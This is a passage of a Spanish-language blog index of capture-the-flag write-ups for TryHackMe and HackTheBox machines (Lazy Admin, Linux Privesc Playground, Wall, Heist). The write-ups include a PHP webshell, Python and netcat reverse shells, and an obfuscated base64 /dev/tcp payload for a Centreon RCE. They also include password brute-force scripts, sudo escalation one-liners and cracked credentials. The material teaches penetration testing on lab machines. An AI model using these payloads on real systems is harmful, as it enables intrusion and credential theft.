(CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)ROT13(true,true,13)\u0026amp;input=Wm5WMmMyY2dlV0owZG5BZ2VYWjRjaUJ1SUc5aVptWT0 #2 [Hard] Reto\n19 1A 1C 99 1C 9C A8 38 27 B2 34 27 B9 27 26 28 3C 3B AA 28 A5 AA 2A 29 3C 29 B2 B2 21 B1 AC A6 1C AC 29 A8 38 99 2C Solucion\nHex Workshop \u0026gt; new \u0026gt; Paste Special \u0026gt; CF_TEXT Marcar 'Interpret as a hexadecimal string' \u0026gt; Rotate to the left 8 bits \u0026gt; Base 58 \u0026gt; Caesar Cipher Shift 14\n1- Hex Workshop - Rotate Left 8 bits\n2- Base 58\n248389QpNehNsNLPxvUPKUTRxReeBcYM8YRQp3X 3- Caesar Cipher Shift 14 (dcode.fr)\nfuvsg nevguzrgvp yvxr n obff #3 [Insane] Reto\nA9 A8 2B EE 2A AA C9 C8 C9 AA A8 0F 2A 8A AA EE A9 8A CA A8 A9 4F 6D 46 E9 A8 A8 0F A9 8A 6D 86 A9 AA A9 26 2A 8A 48 E8 Solucion\nRotate to the left 8 bits (3 veces) \u0026gt; Base64 \u0026gt; Block Shift Left (2 veces) \u0026gt; Base85 \u0026gt; Caesar Cipher (Shift 13)\n1- Rotate to the left 8 bits (3 veces)\nMEYwQUNFNUExQTUwMTVEMzk2OEExMTk4MUM1QTBG 2- Base64\n0F0ACE5A1A5015D3968A11981C5A0F 3- Block Shift Left (2 veces)\n\u0026lt;+9hi@WNZ(F`qh\u0026lt; 4- Base85\nTbq bs fuvsf 5- Caesar Cipher (Shift 13)\nGod of shifs ","description":"","id":66,"section":"posts","tags":["challenge"],"title":"TryHackMe - Break It","uri":"https://sckull.github.io/posts/breakit/"},{"content":"Lazy Admin es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Lazy Admin     Info Easy linux machine to practice your skills   Puntos 385   Dificultad Relativamente Facil   Maker MrSeth6797    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra dos puertos abiertos el http (80) y el ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535 10.10.68.91 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-12 04:49:57 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.68.91 Discovered open port 80/tcp on 10.10.68.91 # Nmap 7.80 scan initiated Wed Dec 11 22:50:33 2019 as: nmap -sV -sC -o nmap_scan 10.10.68.91 Nmap scan report for 10.10.68.91 Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA) | 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA) |_ 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 11 22:51:22 2019 -- 1 IP address (1 host up) scanned in 48.56 seconds   WHATWEB Vemos que la pagina esta corriendo sobre un Apache 2.4.18.\nHTTP Al visitar la pagina nos muestra el tipico index de apache.\nGOBUSTER Utilizamos esta herramienta para poder obtener los directorios y archivos ue puedan ser interesantes.\n1 2 3 4 5 6  root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/ -x php,txt,html -q -t 15 -w /usr/share/wordlists/dirb/common.txt /content (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) root@aoiri:~/tryhackme/lazyadmin#   Sweet Rice CMS /content Encontramos un CMS especificamente Sweet Rice, con un mensaje que indica que el sitio web esta en construccion.\nPasamos nuevamente gobuster sobre la direccion de SweetRice y econtramos distintos directorios relacionados con el gestor de contenidos.\n1 2 3 4 5 6 7 8 9 10 11 12  root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/content/ -x php,txt,html -q -t 15 -w /usr/share/wordlists/dirb/common.txt /_themes (Status: 301) /as (Status: 301) /attachment (Status: 301) /changelog.txt (Status: 200) /images (Status: 301) /inc (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /license.txt (Status: 200) root@aoiri:~/tryhackme/lazyadmin#   Una direccion interesante es /as, contiene un panel de logeo, intentamos utilizar las credenciales por default pero no logramos acceder.\nBuscamos exploits que pudiesen afectar a este gestor de contenidos y encontramos distintas vulnerabilidades.\nSweetRice 1.5.1 - Backup Disclosure Una de ellas indica que existe un backup de mysql en el directorio /inc/mysql directorio que existe en esta pagina.\nDescargamos el archivo y al analizarlo encontramos que se hizo una insersion en la tabla options donde encontramos un nombre y una contraseña, las cuales podemos utilizar en el panel de logeo.\nBuscamos el hash en crackstation y obtuvimos la contraseña en texto plano:\nCredenciales:\nUser: manager Password: Password123 SweetRice 1.5.1 - Arbitrary File Upload Utilizamos un exploit que afecta a este gestor de contenidos para subir una shell, antes de ejecutarlo agregamos la ip y un dominio a nuestro archivo hosts (lazyadmin.thm en mi caso) ya que nos pedira un dominio y no una IP. Tambien agregamos /content/ a los valores que contienen /as/ y /attachment/.\nCreamos un archivo en php de prueba:\n1  echo \u0026#34;\u0026lt;?php echo \u0026#39;:D\u0026#39;; ?\u0026gt;\u0026#34; \u0026gt; shellfoo.php5   Ejecutamos y vemos que se subio nuestro archivo:\nNuestro archivo de prueba:\nSubimos una webshell:\n1 2 3 4 5 6 7 8 9  \u0026lt;?php if(isset($_REQUEST[\u0026#39;cmd\u0026#39;])){ echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; $cmd = ($_REQUEST[\u0026#39;cmd\u0026#39;]); system($cmd); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; die; } ?\u0026gt;   Ejecutamos un comando para obtener una shell inversa:\n1  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.8.1.72\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   USER - Flag Nos movemos a la carpeta principal del usuario itguy y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una enumeracion rapida con el comando sudo -l -l, y vemos que hay un archivo que podemos ejecutar con perl con el comando sudo, a su vez este archivo ejecuta otro (/etc/copy.sh), este ultimo ejecuta un comando para obtener una shell inversa hacia una IP.\n/home/itguy/backup.pl\n1 2 3  #!/usr/bin/perl system(\u0026#34;sh\u0026#34;, \u0026#34;/etc/copy.sh\u0026#34;);   copy.sh\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.0.190 5554 \u0026gt;/tmp/f   El archivo backup.pl no puede ser modificado, pero el archivo copy.sh si, hicimos una pequeña prueba con un comentario en bash.\n1  echo \u0026#34;#foo\u0026#34; \u0026gt;\u0026gt; /etc/copy.sh   Permisos copy.sh:\nAgregamos una shell inversa al archivo copy.sh:\n1  echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1337 \u0026gt;/tmp/f\u0026#34; \u0026gt; /etc/copy.sh   Ejecutamos y obtenemos una shell inversa con el usuario root, junto con nuestra flag root.txt.\nFirefox Decrypt Dentro de la carpeta principal del usuario itguy encontramos la carpeta .mozilla/firefox/, utilizamos firefox_decrypt para obtener las contraseñas y usuarios guardados.\n","description":"","id":67,"section":"posts","tags":["linux","firefox decrypt"],"title":"TryHackMe - Lazy Admin","uri":"https://sckull.github.io/posts/lazyadmin/"},{"content":"Linux Privesc Playground es una maquina de TryHackMe aqui encontrarás la solucion para escalar privilegios de distintas formas.\n Informacion de la Maquina    Titulo Linux Privesc Playground     Info A linux privilege escalation playground, filled with badly configured superuser permissions, incorrectly set SUID bits, and more!   Puntos 358   Dificultad Relativamente Facil   Maker SherlockSec    Linux Privesc Playground, contiene ficheros del tipo SUID los cuales al ejecutarlos, se obtiene permisos del usuario quien creo este fichero unicamente durante la ejecucion.\nLas credenciales de la maquina:\n1  SSH Credentials - user:password   Para poder enumerar los ficheros del tipo SUID podemos utilizar los siguientes comandos:\n1 2 3  find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah find / -perm -u=s -type f 2\u0026gt;/dev/null   De igual forma podemos utilizar sudo para poder ver que ficheros pueden ser ejecutados bajo el comando sudo.\n1  sudo -l -l   Podemos ver que nos devuelve una lista de ficheros los cuales pueden ser utilizados para obtener privilegios de root.\nA continuacion se listan la solucion para alguno de ellos, se puede encontrar los comandos en la pagina GTFOBINS.\n/bin/apt-get* En el caso de este fichero al consultar sobre la existencia en el directorio que nos muestra el listado no existe en esa direccion. Utilizamos cp para copiar el acrhivo y lo colocamos en la direccion /bin/.\nComando:\n1  sudo /bin/apt-get update -o APT::Update::Pre-Invoke::= /bin/bash   /usr/bin/aria2c Ya que podemos ejecutar este archivo con el comando sudo, podemos aprovechar las diferentes opciones que tiene el archivo. aria2c en su version 1.13.0.\nComando:\n1  sudo /usr/bin/aria2c -i /root/flag.txt   /usr/sbin/arp Comando:\n1  LFILE=/root/flag.txt; sudo arp -v -f \u0026#34;$LFILE\u0026#34;   /bin/ash Comando:\n1  sudo /bin/ash   /usr/bin/awk Comando:\n1  sudo awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39;   /usr/bin/base64 Comando:\n1 2  LFILE=/root/flag.txt sudo base64 \u0026#34;$LFILE\u0026#34; | base64 --decode   /bin/bash Comando:\n1  sudo bash   /bin/busybox Comando:\n1  sudo busybox sh   /bin/cat Comando:\n1  sudo /bin/cat /root/flag.txt   /bin/chmod Comando:\n1 2  LFILE=/root/flag.txt sudo chmod 0777 $LFILE   /bin/chown Comando:\n1 2  LFILE=/root/flag.txt sudo /bin/chown $(id -un):$(id -gn) $LFILE   /bin/cp Comando:\n1 2 3 4  FLAG=/tmp/flag.txt TF=/root/flag.txt sudo /bin/cp $TF $FLAG cat $FLAG   /usr/bin/cpan Comando:\n1  sudo cpan   Elegimos no a las opciones hasta CPAN site, entonces \u0026lsquo;Autoconfiguration complete.\u0026rsquo; y escribimos el siguiente comando:\n1  ! exec \u0026#39;/bin/bash\u0026#39;   /bin/crontab Comando:\n1  sudo /bin/crontab -e   Seleccionamos el editor Vim, presionamos ESC y escribimos :!sh.\n![image](/images/posts/thm/LPP/Peek 2019-12-10 00-51.gif)\n/usr/bin/cut Comando:\n1 2  LFILE=/root/flag.txt sudo cut -d \u0026#34;\u0026#34; -f1 \u0026#34;$LFILE\u0026#34;   ","description":"","id":68,"section":"posts","tags":["linux","GTFObins","SUID"],"title":"TryHackMe - Linux Privesc Playground","uri":"https://sckull.github.io/posts/linuxprivescplayground/"},{"content":"Wall es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Wall     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.157   Maker askar    MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  root@kali:~/htb/wall# masscan -p1-65535,U:1-65535 10.10.10.157 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-25 07:02:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.157 Discovered open port 80/tcp on 10.10.10.157 # Nmap 7.80 scan initiated Wed Sep 25 03:46:47 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.157 Warning: 10.10.10.157 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.157 Host is up (0.19s latency). Not shown: 65530 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 32187/tcp filtered unknown 33879/tcp filtered unknown 48249/tcp filtered unknown # Nmap done at Wed Sep 25 03:48:33 2019 -- 1 IP address (1 host up) scanned in 106.19 seconds # Nmap 7.80 scan initiated Wed Sep 25 03:51:32 2019 as: nmap -sV -sC -p22,80 -o nmap_scan 10.10.10.157 Nmap scan report for 10.10.10.157 Host is up (0.24s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA) | 256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA) |_ 256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 25 03:51:50 2019 -- 1 IP address (1 host up) scanned in 18.00 seconds   HTTP - Puerto 80 La pagina web esta corriendo en un Apache/2.4.29.\nHTTP - GOBUSTER Gobuster nos muestra las siguientes rutas de la pagina web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  root@kali:~/htb/wall# gobuster dir -u http://10.10.10.157/ -w /usr/share/wordlists/dirb/common.txt -n -x php,txt,html -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.157/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/25 03:53:54 Starting gobuster =============================================================== /aa.php /index.html /index.html /monitoring /panel.php /server-status =============================================================== 2019/09/25 03:56:21 Finished ===============================================================   /aa.php /monitoring /panel.php Realizamos nuevamente una busqueda con un diccionario diferente y encontramos las siguientes rutas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  root@kali:~/htb/wall# gobuster dir -u http://10.10.10.157/ -w /usr/share/wordlists/subdscan.txt -n -x php,txt,html -t 15 -z =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.157/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/subdscan.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/27 01:12:38 Starting gobuster =============================================================== /aa.php /centreon /index.html /monitoring /panel.php =============================================================== 2019/09/27 01:17:42 Finished ===============================================================   Centreon - RCE /centreon Encontramos la plataforma de centreon de codigo abierto para el monitoreo de software o administracion de infraestructura en su version 19.04.0, al investigar un poco acerca de esta plataforma y su version vemos que existe una vulnerabilidad (CVE-2019-13024) en la plataforma que permite ejecutar codigo remoto (RCE). Para explotar esta vulnerabilidad necesitamos las credenciales de centreon.\nAPI - Centreon Utilizamos python para hacer un ataque de fuerza bruta contra la plataforma utilizando el diccionario rockyou.txt con la siguiente configuracion y utilizando la API de centreon.\nDocumentation Centreon - API\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  #!/usr/bin/python import requests import json filepath = \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39; url = \u0026#39;http://10.10.10.157/centreon/api/index.php?action=authenticate\u0026#39; with open(filepath) as fp: line = fp.readline() while line:\tpassword_r = \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;_pass_\u0026#34;}\u0026#39;.replace(\u0026#39;_pass_\u0026#39;, line.strip()) data = json.loads(password_r) response = requests.post(url, data=data) result = response.json() if result == \u0026#34;Bad credentials\u0026#34;: print(\u0026#34;Password Incorrecta\u0026#34;) elif result == \u0026#34;Bad parameters\u0026#34;: print(\u0026#34;Error en request\u0026#34;) else:\tprint(\u0026#34;User:Pass \u0026#34; + str(data[\u0026#34;username\u0026#34;]+\u0026#34;:\u0026#34;+str(data[\u0026#34;password\u0026#34;])))\tbreak line = fp.readline()   Encontramos la contraseña para el usuario admin:password1:\nHydra Una manera mas facil y sencilla de hacerlo es con hydra:\n1  hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 10.10.10.157 http-post-form \u0026#34;/centreon/api/index.php?action=authenticate:username=^USER^\u0026amp;password=^PASS^:Bad credentials\u0026#34;   RCE - Explotacion | Shell Para explotar la vulnerabilidad de esta plataforma utilizamos el exploit Centreon RCE, al utilizar el exploit y pasarle las credenciales y la url no ejecuta comandos dentro de la maquina, para poder ejecutar comandos utilizamos base64 y shell evasion ya que no permite ejecutar comandos en texto plano.\nInternal Variables\nPrimero codificamos nuestra shell inversa en base64 omitiendo los saltos de linea, luego creamos nuestro comando para ejecucion en la plataforma en donde cada espacio es ${IFS}, y se agrega de ultimo punto y coma (;) ya que la vulnerabilidad permite ejecutar comandos con ciertos parametros (-v /usr/local/centreon/filesGeneration/engine/1/centengine.DEBUG 2\u0026gt;\u0026amp;1) y agregamos esto ultimo para que no ejecute los parametros por default.\n1 2 3  echo -n \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.145/7878 0\u0026gt;\u0026amp;1\u0026#34; | base64 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx echo${IFS}-n${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS};   Agregamos el siguiente codigo por encima de payload_info:\n1  payload_shell = str(repr(\u0026#34;echo${IFS}-n${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS};\u0026#34;)).strip(\u0026#34;\u0026#39;\u0026#34;)   Y dentro de payload_info cambiamos:\n1 2 3  \u0026#34;nagios_bin\u0026#34;: \u0026#34;ncat -e /bin/bash {0} {1} #\u0026#34;.format(ip, port), por: \u0026#34;nagios_bin\u0026#34;: \u0026#34;{}\u0026#34;.format(payload_shell),   Ejecutamos nuestro exploit los parametros de IP y Puerto no importan ya que hemos codificado nuestra shell inversa:\nObtenemos una shell como usuario www-data:\nPrivilege Escalation Como en cualquier maquina realizamos una enumeracion de archivos y binarios que puedan ayudarnos a escalar privilegios a otro usuario en este caso fue distinto ya que la maquina contenia un binario vulnerable que permitia escalar privilegios de administracion.\nSUID - Screen 4.5.0 Trasladamos y ejecutamos el exploit en la maquina y obtenemos una shell con el usuario root y las flags user.txt y root.txt.\n","description":"","id":69,"section":"posts","tags":["linux","centreon","screen"],"title":"Hack The Box - Wall","uri":"https://sckull.github.io/posts/wall/"},{"content":"Heist es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Heist     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.149   Maker MinatoTW    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  root@kali:~/htb/heist# masscan -p1-65535,U:1-65535 10.10.10.149 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-21 06:23:36 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49668/tcp on 10.10.10.149 Discovered open port 445/tcp on 10.10.10.149 Discovered open port 135/tcp on 10.10.10.149 Discovered open port 5985/tcp on 10.10.10.149 Discovered open port 80/tcp on 10.10.10.149 # Nmap 7.70 scan initiated Wed Aug 21 02:32:58 2019 as: nmap -sC -sV -p 49668,445,135,5985,80 -o nmap.scan 10.10.10.149 Nmap scan report for 10.10.10.149 Host is up (0.39s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49668/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 32s, deviation: 0s, median: 32s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-08-21 02:34:36 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 21 02:34:42 2019 -- 1 IP address (1 host up) scanned in 103.97 seconds   HTTP - PUERTO 80 Al visitar este puerto nos muestra un panel de inicio de sesion de una plataforma.\nIniciamos sesion como invitado (Login as guest) y nos redirige a una nueva pagina issues.php en la cual contiene un chat de un cliente que muestra los errores que tuvo con su router cisco y una lista de errores dentro de un archivo.\nArchivo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh   Encontramos dentro del archivo usuarios y contraseñas:\n$1$pdQG$o8nrSzsGXeaduXrjlvKc91 username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 La primera contraseña la crackeamos con hashcat:\n1  stealth1agent:$1$pdQG$o8nrSzsGXeaduXrjlvKc91   Las dos ultimas utilizamos un script que nos devuelve el valor del hash, este hash es de tipo 7 de Cisco:\n  Decode Cisco Password Hash\n  Cisco Password\n  Password Cracker\n  1 2  $uperP@ssword:0242114B0E143F015F5D1E161713 Q4)sJu\\Y8qz*A3?d:02375012182C1A1D751618034F36415408   SMBMAP Ahora que tenemos usuairos y contraseñas intentamos listar sharenames, con el unico usuario con el cual nos dejó fue con el usuario hazard.\nIMPACKET - LOOKUPSID  Impacket toolkit  Utilizamos el script lookupsid.py de impacket para poder obtener los usuarios o grupo de usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@kali:~/htb/heist/evil-winrm# lookupsid.py hazard:stealth1agent@10.10.10.149 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Brute forcing SIDs at 10.10.10.149 [*] StringBinding ncacn_np:10.10.10.149[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112 500: SUPPORTDESK\\Administrator (SidTypeUser) 501: SUPPORTDESK\\Guest (SidTypeUser) 503: SUPPORTDESK\\DefaultAccount (SidTypeUser) 504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser) 513: SUPPORTDESK\\None (SidTypeGroup) 1008: SUPPORTDESK\\Hazard (SidTypeUser) 1009: SUPPORTDESK\\support (SidTypeUser) 1012: SUPPORTDESK\\Chase (SidTypeUser) 1013: SUPPORTDESK\\Jason (SidTypeUser)   CREDENCIALES hazard:stealth1agent rout3r:$uperP@ssword admin:Q4)sJu\\Y8qz*A3?d chase:Q4)sJu\\Y8qz*A3?d jason: support: WINRM  WinRm  Dentro de los puertos abiertos que encontramos vemos que winrm (5985) esta abierto, utilizamos las credenciales y usuarios que encontramos para intentar logearnos mediante este puerto.\nUtilizamos un script en ruby con la libreria winrm para poder ejecutar comandos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  require \u0026#39;winrm\u0026#39; conn = WinRM::Connection.new( endpoint: \u0026#39;http://10.10.10.149:5985/wsman\u0026#39;, user: \u0026#39;chase\u0026#39;, password: \u0026#39;Q4)sJu\\Y8qz*A3?d\u0026#39;, ) command=\u0026#34;\u0026#34; conn.shell(:powershell) do |shell| until command == \u0026#34;exit\\n\u0026#34; do print \u0026#34;PS \u0026gt; \u0026#34; command = gets output = shell.run(command) do |stdout, stderr| STDOUT.print stdout STDERR.print stderr end end puts \u0026#34;Exiting with code #{output.exitcode}\u0026#34; end   Podemos ejecutar comandos en la maquina y obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Estando dentro de la maquina buscamos archivos en los cuales pudiesen haber contraseñas, principalmente los archivos que se utilizan en la plataforma/inicio de sesion de la pagina que contiene la maquina. Encontramos que, dentro del archivo login.php hay una condicion con dos usuarios que pueden logearse: guest y admin.\nlogin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u0026lt;?php session_start(); if( isset($_REQUEST[\u0026#39;login\u0026#39;]) \u0026amp;\u0026amp; !empty($_REQUEST[\u0026#39;login_username\u0026#39;]) \u0026amp;\u0026amp; !empty($_REQUEST[\u0026#39;login_password\u0026#39;])) { if( $_REQUEST[\u0026#39;login_username\u0026#39;] === \u0026#39;admin@support.htb\u0026#39; \u0026amp;\u0026amp; hash( \u0026#39;sha256\u0026#39;, $_REQUEST[\u0026#39;login_password\u0026#39;]) === \u0026#39;91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040\u0026#39;) { $_SESSION[\u0026#39;admin\u0026#39;] = \u0026#34;valid\u0026#34;; header(\u0026#39;Location: issues.php\u0026#39;); } else header(\u0026#39;Location: errorpage.php\u0026#39;); } else if( isset($_GET[\u0026#39;guest\u0026#39;]) ) { if( $_GET[\u0026#39;guest\u0026#39;] === \u0026#39;true\u0026#39; ) { $_SESSION[\u0026#39;guest\u0026#39;] = \u0026#34;valid\u0026#34;; header(\u0026#39;Location: issues.php\u0026#39;); } } ?\u0026gt;   Utilizamos la paigna de md5decrypt para verificar si existe esta contraseña dentro de la pagina:\n md5decrypt  admin@support.htb:91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040 admin@support.htb:4dD!5}x/re8]FBuZ Verificamos mediante samba que el usuario es administrator y, si este tiene permisos.\nConfirmamos que es el usuario y contraseña de administrator, utilizamos nuevamente el script para winrm con las credenciales.\nObtenemos una shell y nuestra bandera root.txt.\n","description":"","id":70,"section":"posts","tags":["windows"],"title":"Hack The Box - Heist","uri":"https://sckull.github.io/posts/heist/"},{"content":"Networked es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Networked     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.146   Maker guly    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  root@kali:~/htb/networked# masscan -p1-65535,U:1-65535 10.10.10.146 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-27 23:43:29 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.146 Discovered open port 22/tcp on 10.10.10.146 # Nmap 7.70 scan initiated Tue Aug 27 22:49:04 2019 as: nmap -sC -sV -p80,22 -o nmap.scan 10.10.10.146 Nmap scan report for 10.10.10.146 Host is up (0.087s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA) | 256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA) |_ 